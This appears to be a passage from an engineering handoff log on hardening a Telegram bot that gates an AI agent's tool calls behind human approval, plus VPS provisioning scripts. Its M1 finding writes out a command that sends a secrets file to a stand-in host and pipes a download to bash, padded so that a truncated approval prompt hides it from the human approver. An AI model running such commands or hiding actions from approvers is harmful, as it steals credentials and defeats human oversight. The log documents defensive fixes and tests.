- **Red #3 — approval user-correlation check removed** (`resolveApproval` stopped checking `entry.userId !== fromUserId`): `npx vitest run src/__tests__/approvals.test.ts src/__tests__/bot.test.ts` → **1 failed** initially (`approvals.test.ts`'s direct correlation test) but the corresponding `bot.test.ts` integration test did **not** fail on the first attempt — traced to a test-design flaw (both taps used the same decision, so a broken vs. correct correlation check produced the same final resolved value). Fixed the test to use a **different** decision for the stranger's tap vs. the real user's tap (deny vs. approve on the same request id) so the assertion actually discriminates; re-ran → **2 failed / 20 passed** as expected. Reverted; re-ran green.
- **Green (full suite):** `npx vitest run` → `Test Files 5 passed (5)`, `Tests 98 passed (98)` (`security.test.ts` 41, `session.test.ts` 3, `approvals.test.ts` 7, `agent.test.ts` 32, `bot.test.ts` 15).
- **Build:** `npx tsc --noEmit` clean (0 errors); `rm -rf dist && npm run build` clean; `dist/` contains only the 8 compiled source files (`agent`, `approvals`, `bot`, `context`, `index`, `security`, `session` + their `.d.ts`/`.map`), no test files, no stray `tools.js`.
- **Tree clean:** `git status` shows only the intended source/test/doc files modified or added (`approvals.ts`, `approvals.test.ts` untracked pre-commit); no `dist/`, `node_modules/`, or `.env` staged.
- **Branch freshness:** `origin/main` (`fb129bb`) confirmed a direct ancestor of the branch HEAD (`git merge-base --is-ancestor origin/main HEAD` succeeds) — branch already up to date with main, no merge needed before this remediation commit.

**Not exercised (documented, not blocking, same as the original Phase 4 handoff):** `index.ts`'s env-validation branches and `startBot`'s live-polling path aren't unit tested — thin process-lifecycle wrappers around already-tested logic. No real Telegram/Anthropic network calls anywhere in the suite. The actual Telegram inline-keyboard rendering (vs. the mocked `sendMessage` call shape) and a live end-to-end approval tap have not been verified against the real Telegram Bot API — deferred to Phase 7 (end-to-end verification) once the VPS exists.

**Specs affected:** none beyond what the original Phase 4 entry already flagged (this bot isn't part of the ASPS product surface documented under `docs/system-specifications/`). No change to that assessment.

**Next steps for CEO/security/QA:**
1. Security re-review on branch `asps-743-migrate-telegram-bot-to-claude-agent-sdk` against the 3 original Blockers + the Major (README) + Minor (bot.ts) findings — all addressed above.
2. QA re-review (functional PASS already obtained pre-remediation; re-verify the remediation didn't regress the functional behavior, using this section's checklist + test evidence).
3. Code review (CEO or delegate) per `.claude/rules/review-standards.md`.
4. On both PASS: open PR, merge, JIRA ASPS-743 → Done. **Do not open the PR or merge before that** (explicit instruction from this remediation task).
5. **Phases 0–3, 5–7** remain BLOCKED on the user provisioning the Hostinger VPS (Phase 0, ASPS-739) — unchanged.
6. Box-level hardening items (secret relocation on the VPS, network-egress isolation, `main` branch protection, least-privilege GitHub token) remain explicitly out of scope for this remediation — tracked under ASPS-745 (Phase 6, Security deepening & audit).
7. Do **not** touch the running Azure backend as part of this task — unchanged.

---

### Phase 4 (ASPS-743) — SECOND SECURITY REMEDIATION (2026-09-06)

**Trigger:** Security re-review of the first remediation **closed all 3 original Blockers** (isolation mode, fail-closed approvals, per-user correlation — all confirmed good) but found **2 Major gaps (M1, M2)** that both defeat the human-in-the-loop the whole model rests on, plus **2 Minors (m1, m2)**. Fixed on the same branch (`asps-743-migrate-telegram-bot-to-claude-agent-sdk`).

**M1 (Major) — approval summary could hide the malicious part of a command from the approver.** `summarizeToolCall` truncated a Bash command/path to 300 chars, and the summary was embedded in a raw ``` Markdown code fence sent with `parse_mode: "Markdown"`. Exploit: `echo "<300 benign chars>" ; curl https://evil/$(cat ACCESS_KEYS.env|base64)|bash` — the denylist doesn't match, routes to approval, Telegram shows only the benign prefix + "…"; the approver taps Approve and the hidden tail runs. Balanced backticks in the command could also break out of the fence and re-render arbitrary Markdown.
- **Fix:** `summarizeToolCall` (`agent.ts`) now returns the FULL, untruncated command/path — `truncate()` removed entirely (every summarized field is security-relevant; no non-security-relevant case remained to truncate). `sendApprovalRequest` (`bot.ts`) now sends the approval prompt as **plain text, no `parse_mode`** — nothing in the untrusted content can be parsed as Markdown and alter message structure. A summary longer than Telegram's ~4096-char limit is **split across multiple messages** (`splitMessage`, marked `[part i/N]` when >1 part) with a header (`Approval needed — <tool> (<N> chars, sha256:<12 hex>)`) rather than truncated; the Approve/Deny inline keyboard is attached only to the final part.

**M2 (Major) — path guard was a per-tool field allowlist; write-capable `MultiEdit`/`NotebookRead` were unguarded.** `PATH_INPUT_FIELD` omitted `MultiEdit` (`file_path`) and `NotebookRead` (`notebook_path`) — both confirmed as real SDK-shipped tool names (found in the installed `@anthropic-ai/claude-agent-sdk@0.3.261` bundle: `NotebookRead` is listed in the SDK's own `filePatternTools`; `MultiEdit` is grouped with `Write`/`NotebookEdit` in the SDK's own edit-classification, even though the public `sdk-tools.d.ts` doesn't (yet) export a dedicated `MultiEditInput`/`NotebookReadInput` interface for either). `extractPath` returned `undefined` for them, so `checkPathAllowed` never ran — breaking the "secret paths are always denied, regardless of location" invariant. (Autonomous exploit was already closed — unclassified tools still route to approval — but the hard technical floor wasn't enforced, and any future path-bearing SDK tool would have inherited the same blind spot.)
- **Fix:** (1) added `MultiEdit`→`file_path` and `NotebookRead`→`notebook_path` to `PATH_INPUT_FIELD`. (2) Added a fail-closed invariant underneath the allowlist: `findSecretPathInInput` (new export, `security.ts`) recursively scans **every string-valued field** of a tool's input — arrays and nested objects included (e.g. `MultiEdit`'s `edits[]`) — against `SECRET_PATH_PATTERNS`, for **any** tool, known or not, and hard-denies unconditionally on a hit. `createCanUseTool` (`agent.ts`) now runs this scan **first**, before the per-tool path guard, Bash denylist, or auto-allow classification.

**m1 (Minor) — README/`.env.example` overstated or misstated the guarantee.**
- `README.md:194` said secret paths are "always denied by the path guard" — now literally true after M2; rewrote the whole "Path guard" section (and the top-level Security bullet list) to describe the two-layer scan (`findSecretPathInInput` first, `checkPathAllowed` second) precisely, and to cover `MultiEdit`/`NotebookRead`/M1's full-content-plain-text approval prompt/subagent-inheritance in the same pass.
- `.env.example:35`'s comment ("CLAUDE.md, .claude/settings.json, and .mcp.json are auto-loaded from here") was false under the current `settingSources: []` — settings.json is deliberately NOT loaded, CLAUDE.md/.mcp.json are hand-loaded by `context.ts`. Corrected.

**m2 (Minor) — Task/subagent permission inheritance, verified.** Checked the installed SDK's own `CanUseTool` type (`node_modules/@anthropic-ai/claude-agent-sdk/sdk.d.ts`): the third (`options`) argument documents an `agentID?: string` field — *"If running within the context of a sub-agent, the sub-agent's ID"* — which only makes sense if the SDK re-invokes `canUseTool` for tool calls issued from *inside* a `Task`-spawned subagent, passing that subagent's id. **Finding: subagent tool calls DO re-enter `canUseTool`.** No code change needed (and `Task` was NOT added to `disallowedTools`, since restricting it wasn't necessary given the confirmed inheritance) — `createCanUseTool` never reads `agentID`, so the exact same deny-by-default policy (secret-path scan, path guard, Bash denylist, approval requirement) already applies identically whether or not a call originates from a subagent. Added 3 regression tests in `agent.test.ts` (describe block "subagent (Task) tool calls re-enter canUseTool") that call `canUseTool` with `agentID: "sub-1"` set on the options argument and assert the Bash hard-deny, the Write approval-gate, and the M2 secret-path hard-deny all still apply — pinning down that no future change can special-case `agentID` into a bypass. Documented this finding in `README.md`'s Security section and in `agent.ts`'s `createCanUseTool` JSDoc.

**Changed files:**
- `apps/telegram-ceo/src/security.ts` — added `findSecretPathInInput(input): SecretPathHit | undefined` (recursive secret-pattern scan over any tool input, exported alongside a `SecretPathHit { field, pattern }` type) and `scan()` helper. No changes to existing exports.
- `apps/telegram-ceo/src/agent.ts` — `PATH_INPUT_FIELD` gained `MultiEdit`/`NotebookRead`; `truncate()` removed; `summarizeToolCall` now returns full content; `createCanUseTool` runs `findSecretPathInInput` first and hard-denies on a hit; JSDoc rewritten for both functions and the permission-policy evaluation order (now 5 steps, was 4) including the subagent-inheritance note.
- `apps/telegram-ceo/src/bot.ts` — `sendApprovalRequest` rewritten: computes a header (`tool name`, full summary length, 12-hex sha256), builds `fullText = header + "\n\n" + summary`, splits via the existing `splitMessage` helper, marks parts `[part i/N]` when >1, sends each part as plain text (no `parse_mode`) with the Approve/Deny keyboard attached only to the last part; parts are dispatched synchronously (not serialized behind `await`) so the whole prompt goes out in one pass. Added `node:crypto`'s `createHash` import.
- `apps/telegram-ceo/.env.example` — corrected the `WORKING_DIR` comment (removed the false "CLAUDE.md, .claude/settings.json, and .mcp.json are auto-loaded" claim; now correctly describes `settingSources: []` isolation mode and hand-wiring).
- `apps/telegram-ceo/README.md` — rewrote the Security bullet list, the "Path guard" and "Deny-by-default + Telegram approval" subsections, and the tool-list bullet to reflect M1 (full content, plain text, split-not-truncate) and M2 (`MultiEdit`/`NotebookRead` coverage + the invariant scan) + the m2 subagent-inheritance finding.
- `apps/telegram-ceo/src/__tests__/security.test.ts` — added a `findSecretPathInInput` describe block (top-level field, nested array/object field, unknown-tool arbitrary nesting, negative case, non-string-value robustness).
- `apps/telegram-ceo/src/__tests__/agent.test.ts` — added: MultiEdit-outside-workingDir path-guard-confinement test, NotebookRead-secret-pattern test, ordinary-in-tree-MultiEdit-still-routes-to-approval test (all M2/`PATH_INPUT_FIELD`); a new "secret-path invariant scan" describe block (MultiEdit file_path itself secret, nested `edits[].new_string` secret, unknown-tool nested secret, ordinary MultiEdit unaffected) (M2/`findSecretPathInInput`); a new "subagent (Task) tool calls re-enter canUseTool" describe block (3 tests, m2); 2 new tests under the Bash-hard-deny block asserting the FULL command/path reaches `requestApproval` untruncated (M1).
- `apps/telegram-ceo/src/__tests__/bot.test.ts` — added a describe block "approval-summary fidelity and transport safety" (3 tests): full malicious tail present verbatim in the sent text, no `parse_mode: "Markdown"` ever sent for an approval prompt (with content that would previously break a code fence), and a >4096-char command is split into multiple parts with the keyboard only on the last part and the full content recoverable by concatenating parts (minus `[part i/N]` markers).

**TDD evidence (Red → Green), exact commands `cd apps/telegram-ceo && npx vitest run <file>`:**
- **Red — M2 (`security.test.ts`):** added `findSecretPathInInput` tests before the function existed → `npx vitest run src/__tests__/security.test.ts` → **5 failed / 41 passed** (`TypeError: findSecretPathInInput is not a function`). Implemented the function → re-ran → **46 passed**.
- **Red — M2 (`agent.test.ts`):** added MultiEdit/NotebookRead/nested-secret/subagent tests before `PATH_INPUT_FIELD`/`findSecretPathInInput` were wired into `createCanUseTool` → `npx vitest run src/__tests__/agent.test.ts` → **8 failed / 36 passed** (MultiEdit/NotebookRead not path-guarded; nested/unknown-tool secret paths not hard-denied — routed to approval instead). Wired the invariant scan + extended `PATH_INPUT_FIELD` → re-ran → **44 passed**.
- **Red — M1 (`agent.test.ts`):** added full-command/full-path assertions before removing `truncate()` → same run above already included **2** of the 8 failures for this (`expected … Bash …` / `… Write …` called with the truncated+`…`-suffixed string, not the full one). Removed `truncate()`/updated `summarizeToolCall` → included in the same **44 passed** green run.
- **Red — M1 (`bot.test.ts`):** added the 3-test "approval-summary fidelity and transport safety" block before touching `bot.ts` → `npx vitest run src/__tests__/bot.test.ts` → **2 failed / 16 passed** (`parse_mode` was still `"Markdown"`; a 5000-char command produced only 1 `sendMessage` call instead of being split). Rewrote `sendApprovalRequest` → re-ran → **18 passed**. (The "full command present" test passed immediately in this file because `agent.ts`'s M1 fix, done first, already stopped truncating before the text reached `bot.ts` — the transport-level tests for *this* file were specifically the Markdown/`parse_mode` and the split-not-truncate behavior.)
- Fixed an async-timing bug in the first draft of the split fix: `await`-ing each `bot.sendMessage()` inside the loop meant only the first part had actually been sent by the time a non-awaiting test asserted on `mock.calls` (JS microtask ordering) — switched to firing all parts synchronously with `.catch()` per call (matching the pre-existing fire-and-forget style of the original code) so the whole prompt dispatches in one synchronous pass, matching how `approvals.ts` invokes the handler (`void requestHandler(...)`, not awaited).
- **Green (full suite):** `cd apps/telegram-ceo && npm test` → `Test Files 5 passed (5)`, `Tests 118 passed (118)` (`security.test.ts` 46, `session.test.ts` 3, `approvals.test.ts` 7, `agent.test.ts` 44, `bot.test.ts` 18). No existing test was weakened, skipped, or deleted — 20 new tests added on top of the prior 98.
- **Build:** `npm run build` (`tsc`) — clean, 0 errors.
- **Tree/commit:** committed as `ASPS-743 Harden approval-summary fidelity and path-guard coverage`, pushed to `asps-743-migrate-telegram-bot-to-claude-agent-sdk`.

**Not exercised (documented, not blocking):** the m2 finding relies on the SDK's own type documentation (`agentID` field semantics) rather than a live end-to-end subagent invocation against the real SDK (which the mocked test suite cannot exercise) — flagged for QA/security to note as the basis for the m2 conclusion; the regression tests added confirm `createCanUseTool`'s own logic doesn't special-case `agentID`, not that the SDK actually calls it that way at runtime (though the type's own doc comment is strong first-party evidence that it does).

**Specs affected:** none beyond what the original Phase 4 entry already flagged — this bot isn't part of the ASPS product surface documented under `docs/system-specifications/`.

**Next steps for CEO/security/QA:**
1. Security re-review on branch `asps-743-migrate-telegram-bot-to-claude-agent-sdk` against M1, M2, m1, m2 above — all addressed.
2. QA re-review (functional PASS already obtained; re-verify no regression, using the 118-test green run + this section's checklist).
3. Code review (CEO or delegate) per `.claude/rules/review-standards.md`.
4. On both PASS: open PR, merge, JIRA ASPS-743 → Done. **Do not open the PR or merge before that.**
5. **Phases 0–3, 5–7** remain BLOCKED on the user provisioning the Hostinger VPS (Phase 0, ASPS-739) — unchanged.

---

### Phase 1 + 2 (ASPS-740 / ASPS-741) — provisioning scripts authored, not executed (2026-09-06)

**Trigger:** CEO delegated authoring of ready-to-run (but not-yet-executed) Phase 1 + Phase 2
provisioning scripts, ahead of the VPS existing, so Phase 0 (user buys the box) is the only
remaining blocker before Phases 1–2 can actually run.

**Branch:** `asps-740-vps-provisioning-scripts` (created by CEO before delegating). Not merged —
no PR opened yet, per explicit instruction (CEO + security review the hardening script first).

**New files, all under `deploy/vps/`:**
- `01-harden.sh` (ASPS-740) — idempotent Phase 1 baseline hardening: apt update/full-upgrade +
  unattended-upgrades; creates non-root sudo user `aspsbot` with SSH-key-only auth; sshd hardening
  via a validated (`sshd -t`), reload-not-restart drop-in at
  `/etc/ssh/sshd_config.d/99-aspsbot-hardening.conf` (`PermitRootLogin no`,
  `PasswordAuthentication no`, `PubkeyAuthentication yes`, `AllowUsers aspsbot`, configurable
  `Port`); locks the root password as defense-in-depth; UFW (default deny incoming / allow
  outgoing / SSH port only); fail2ban for sshd; swap file (config-driven size, default 2G);
  timezone/hostname; and creates the `SECRETS_DIR` (`/home/aspsbot/secrets`, mode 700) that
  Phase 3/5 will populate — see "secret placement" below.
- `02-toolchain.sh` (ASPS-741) — idempotent Phase 2 toolchain: Node 20 LTS (NodeSource), git,
  ripgrep, build-essential; `@anthropic-ai/claude-code` CLI; .NET 8 SDK (Microsoft apt feed);
  Python 3.11 + venv (deadsnakes PPA — Ubuntu 24.04 ships 3.12 by default, not 3.11) + pip; Docker
  Engine + compose plugin, with `aspsbot` added to the `docker` group behind a loud, explicit
  WARNING comment (docker-group ≈ root — known/accepted debt for D4, pending Security sign-off on
  ASPS-745). Ends with a non-fatal verify block printing `node -v`/`npm -v`/`dotnet
  --version`/`python3.11 --version`/`docker --version`/`rg --version`.
- `lib.sh` — shared logging (`log_info`/`log_warn`/`log_error`/`log_step`), `require_root`,
  `require_ubuntu_2404`, `load_config` (sources `config.env`, validates required vars, refuses the
  placeholder SSH key), and `write_if_changed` (content-compare-before-write, used for every
  managed config file so re-runs don't needlessly rewrite/reload) — sourced by both numbered
  scripts, not run directly.
- `config.env.example` — placeholder config (`ASPSBOT_USER`, `ASPSBOT_SSH_PUBLIC_KEY`, `SSH_PORT`
  default `2222`, `TIMEZONE` default `Asia/Jerusalem`, `HOSTNAME_FQDN`, `SWAP_SIZE_GB` default `2`,
  `REPO_URL`, `CLONE_PATH`, `SECRETS_DIR` default `/home/aspsbot/secrets`). Real `config.env` is
  gitignored (added `deploy/vps/config.env` to root `.gitignore`).
- `README.md` — run order, prerequisites, config reference, the secret-placement rule (below),
  the ASPS-745 box-level items explicitly deferred to Phase 6, the docker-group warning, and why
  static validation (not live execution) satisfies TDD rule item 9 here.

**No separate `deploy/vps/.gitattributes` added** — the repo-root `.gitattributes` already has
`*.sh text eol=lf` (applies repo-wide, confirmed via `git check-attr text eol -- deploy/vps/*.sh`
→ `eol: lf` for all three scripts; `file deploy/vps/*.sh` reports no CRLF).

**Decisions made while authoring (flag for review, not yet confirmed by CEO/security):**
1. **`SSH_PORT` default `2222`** (non-default, optional per the task spec) — cosmetic/log-noise
   reduction only, not a real control; easy to override to `22` in `config.env`. **Needs
   confirmation** — no strong reason for `2222` specifically beyond "a common non-22 default,"
   flagging rather than treating as final.
2. **`SWAP_SIZE_GB` default `2`** — matches the task spec's explicit default.
3. **Root password locked (`passwd -l root`)** in addition to `PermitRootLogin no` — not explicitly
   requested by the task text but a natural, low-risk extension of "lock/disable direct root SSH";
   flagging as a judgment call in case the operator wants root password login preserved for
   provider-console recovery (the script only locks it if not already locked, and it's reversible
   with `passwd -u root`).
4. **Python 3.11 via deadsnakes PPA** — Ubuntu 24.04's default repos ship Python 3.12, not 3.11;
   the task/handoff both specify 3.11 (matching the desktop agent's stack), so `02-toolchain.sh`
   adds `ppa:deadsnakes/ppa`. Flagging as a third-party PPA dependency in case Security prefers a
   different source (e.g. pyenv, building from source) on a hardened box.
5. **UFW stays `default allow outgoing`** — the task's own Phase 1 spec says exactly this ("Bot
   uses outbound long-poll — no inbound app port"); egress narrowing to specific endpoints is
   ASPS-745 item (2), deliberately not implemented here. Documented in README so it isn't mistaken
   for an oversight.
6. **`SECRETS_DIR` created but not populated** — Phase 1/2 scope is the directory + permissions
   only; actually placing `ACCESS_KEYS.env`/the bot `.env` there is Phase 3 (ASPS-742, not yet
   authored) and referencing it via systemd `EnvironmentFile` is Phase 5 (ASPS-744).

**Security review round 1 (2026-09-06): FAIL — 1 Blocker + 2 Majors, all sshd-hardening
correctness defects on Ubuntu 24.04. Remediated same day on the same branch, security
re-review requested:**

1. **Blocker — sshd socket activation ignored the drop-in `Port`.** Ubuntu 24.04 ships
   `ssh.socket` (systemd socket activation) listening on `:22`; with it active,
   `sshd_config.d/*.conf`'s `Port` directive is silently ignored (sshd stays on 22) even though
   `sshd -t` still passes — Step 6 would then open only the custom `SSH_PORT` in UFW, leaving the
   box unreachable on the only port UFW allows. **Fix:** `01-harden.sh` now detects `ssh.socket`
   activation (`ssh_socket_activation_active` in `lib.sh`), disables it and switches to
   `ssh.service` binding the port directly (idempotent), and asserts via `ss -tlnp`
   (`assert_sshd_listening`) that sshd is actually listening on `SSH_PORT` **before** touching UFW
   — aborting first if not. **`SSH_PORT` default changed from `2222` to `22`** (a custom port is
   still supported and safe with respect to this script now, but the VPS also sits behind
   Hostinger's own cloud-panel firewall, separate from UFW — a non-22 port must also be opened
   there, documented in `config.env.example`/README).
2. **Major — drop-in precedence could leave password auth on (fail-open).** sshd is
   first-value-wins over `sshd_config.d/*.conf` in lexical order; a cloud image's
   `50-cloud-init.conf` (`PasswordAuthentication yes`) would sort before the old
   `99-aspsbot-hardening.conf` and win, while `sshd -t` still passed. **Fix:** drop-in renamed to
   `00-aspsbot-hardening.conf` (sorts first); `01-harden.sh` also comments out
   `PasswordAuthentication`/`PermitRootLogin` in `50-cloud-init.conf` if found; and — the real
   gate — `assert_effective_sshd_config` in `lib.sh` checks `sshd -T`'s fully-merged output for
   `passwordauthentication no` / `permitrootlogin no` / `pubkeyauthentication yes` and aborts
   before UFW if not true, on every run (not just when something changed).
3. **Major — root could be locked before a working sudo path existed (total-lockout risk).**
   `passwd -l root` ran unconditionally right after creating `aspsbot` with no password (set
   manually later) — if the operator closed the root session first, the box had no root (locked)
   and no working sudo (no password to prompt against) = provider-rescue only. **Fix:** new
   `LOCK_ROOT` config flag, default `false` — root's password is left alone by default (safe,
   since `PermitRootLogin no` already blocks root over SSH regardless). `LOCK_ROOT=true` only
   actually locks root if `passwd -S aspsbot` shows a usable password (`P`); otherwise it skips
   the lock with a loud warning instead of risking lockout, and forces `aspsbot` to (re)set its
   password on next login (`chage -d 0`) once it does lock root.
4. **Minor — NodeSource `curl \| bash -`** replaced with the keyring method
   (`/etc/apt/keyrings/nodesource.gpg` + `signed-by=`), matching the Docker block's pattern.
5. **Minor — deadsnakes/Python 3.11 dropped.** Re-checked against actual need: the agent's
   build/test path is `docker compose up` and Analyzers carry their own Python in-container, so
   the VPS host doesn't need 3.11. `02-toolchain.sh` now installs Ubuntu 24.04's system `python3`
   (3.12) + `python3-venv` + `python3-dev` + `python3-pip` instead of the third-party PPA. This is
   a deviation from D4's literal "Python 3.11" wording in section 2 above — flagging it here
   rather than silently diverging; re-add deadsnakes if a concrete host-level 3.11 need surfaces.
6. **Minor — Claude Code CLI version** left floating (not pinned), documented rationale
   (self-updating dev-tool CLI, not a production image artifact) plus an idempotency guard
   (`command -v claude` check) so re-runs don't force a reinstall.
7. **.NET `.deb` bootstrap** — left as-is, accepted debt, no change (per remediation scope).

All three scripts re-verified clean: `bash -n` (all three) and `shellcheck --shell=bash` via
`koalaman/shellcheck:stable` (zero findings, all severities) after the fixes above. Line endings
re-confirmed pure LF (no CRLF) via a byte-level check (`\r\n` / lone `\r` counts = 0 in all four
changed files). No pure-bash helper was extracted for isolated unit testing — the new assertion
functions (`assert_effective_sshd_config`, `assert_sshd_listening`,
`ssh_socket_activation_active`) all depend on live `sshd -T`/`ss`/`systemctl` state and cannot be
meaningfully unit-tested without a real host; see `deploy/vps/README.md` "Validation performed".

**Changed files (remediation commit):** `deploy/vps/lib.sh`, `deploy/vps/01-harden.sh`,
`deploy/vps/02-toolchain.sh`, `deploy/vps/config.env.example`, `deploy/vps/README.md`, this
handoff file.

**Validation performed (why this satisfies TDD rule item 9 — declarative config, no VPS to run
against yet):**
- `bash -n lib.sh 01-harden.sh 02-toolchain.sh` — all three clean.
- `shellcheck --shell=bash` via `docker run --rm koalaman/shellcheck:stable` (shellcheck isn't
  installed locally) — all three clean, **zero findings** at any severity (fixed 3 initial `info`
  findings: two `SC2015` `A && B || C` patterns in `01-harden.sh` rewritten as explicit `if/then/
  else`, one `SC1091` in `02-toolchain.sh` — sourcing `/etc/os-release` inline replaced with an
  `awk` extraction of `VERSION_CODENAME`).
- Idempotency reasoned through per-step (not exercised by an actual second run — no box exists):
  every mutating step checks current state first (`id -u`, `dpkg -s`, `grep -qxF`, `ufw status`,
  `swapon --show`, `timedatectl show -p Timezone --value`, `command -v`, `write_if_changed`'s
  compare-before-write).
- **Not exercised, explicitly not blocking:** actual execution against Ubuntu 24.04. This is the
  real verification and has not happened — DoD for ASPS-740/741 is NOT met until it does (see next
  steps).

**JIRA:** ASPS-740 and ASPS-741 already `In Progress` with `devops` label (ASPS-740 also
`security`) — no status change made (not ready for "In Review": no PR, no QA/security review of
the actual scripts yet — only static validation). Added a comment to both issues noting the
scripts are authored, validated statically, and awaiting review; not executed.

**Specs affected:** none under `docs/system-specifications/` — this is VPS/ops infrastructure
(devops-owned, `docs/cloud/`-adjacent), not ASPS product/protocol surface. `docs/cloud/` itself
not touched either — no Azure/Container Apps/CI-CD change (VPS is Hostinger, fully separate from
the Azure backend per D1).

**Next steps for CEO/security:**
1. **Security RE-review** of `deploy/vps/01-harden.sh`, `02-toolchain.sh`, `lib.sh` on branch
   `asps-740-vps-provisioning-scripts` against the round-1 findings above (all 1 Blocker + 2 Majors
   + Minors addressed — see "Security review round 1" subsection above for fix detail per
   finding). Not yet re-reviewed as of this update.
2. CEO code review of the same files against `.claude/rules/review-standards.md` (not yet done —
   was pending the security round before round 1, still pending after remediation).
3. Decisions now resolved by this remediation (no longer open questions): `SSH_PORT` default is
   now `22` (was `2222`); root-lock is now opt-in via `LOCK_ROOT=false` default (was unconditional
   `passwd -l root`); deadsnakes/Python 3.11 dropped in favor of system Python 3.12 (was a PPA).
   Flag to CEO/user only if any of these three resolutions themselves need to be revisited.
4. **Do not open a PR or merge yet** — explicit instruction, unchanged. Once security re-review
   and CEO code review both pass, follow the normal `task-workflow.md` flow (PR → JIRA to In
   Review → CEO merge → JIRA to Done) — there is still no QA agent step analogous to app-code QA
   here; "QA" for this task is the review above plus, ultimately, a real run against the VPS once
   Phase 0 completes.
5. **Phase 0 (ASPS-739)** is still the hard gate for actually *running* these scripts — authoring
   ahead of it was explicitly requested so Phases 1–2 are ready to execute the moment the VPS
   exists.
6. Phase 3 (ASPS-742, clone repo & wire secrets) is the next script to author once Phase 1/2 are
   approved — it will populate `SECRETS_DIR` per the placement rule documented in
   `deploy/vps/README.md`.

## 7. JIRA
See the JIRA table at the top of this handoff (epic ASPS-738 + stories ASPS-739…746).
